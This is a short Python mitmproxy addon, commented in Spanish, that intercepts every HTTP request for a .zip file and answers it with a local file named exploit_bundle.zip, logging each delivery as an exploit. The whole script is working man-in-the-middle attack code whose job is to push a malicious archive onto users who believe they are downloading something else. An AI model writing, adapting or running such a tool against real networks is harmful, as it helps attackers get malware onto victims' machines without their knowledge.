#!/usr/bin/env python3
"""
Sirve exploit_bundle.zip para cualquier petición *.zip
(no depende del servidor de origen)
"""

from mitmproxy import http, ctx
from pathlib import Path

EXPLOIT = Path(__file__).with_name("exploit_bundle.zip")

class OfflineExploit:
    def load(self, loader):
        if not EXPLOIT.exists():
            ctx.log.error(f"[!] {EXPLOIT} NO encontrado")
        else:
            size = EXPLOIT.stat().st_size
            ctx.log.info(f"[+] Sirviendo {EXPLOIT.name} ({size} bytes)")

    # ← usamos el hook REQUEST, no response
    def request(self, flow: http.HTTPFlow):
        if not flow.request.pretty_url.lower().endswith(".zip"):
            return              # ignoramos lo que no sea .zip

        data = EXPLOIT.read_bytes()
        ctx.log.warn(f"💣 Entregando exploit a {flow.request.pretty_url}")

        flow.response = http.Response.make(
            200,
            data,
            {
                "Content-Type":  "application/zip",
                "Content-Length": str(len(data)),
                "Cache-Control": "no-store"
            },
        )

addons = [OfflineExploit()]
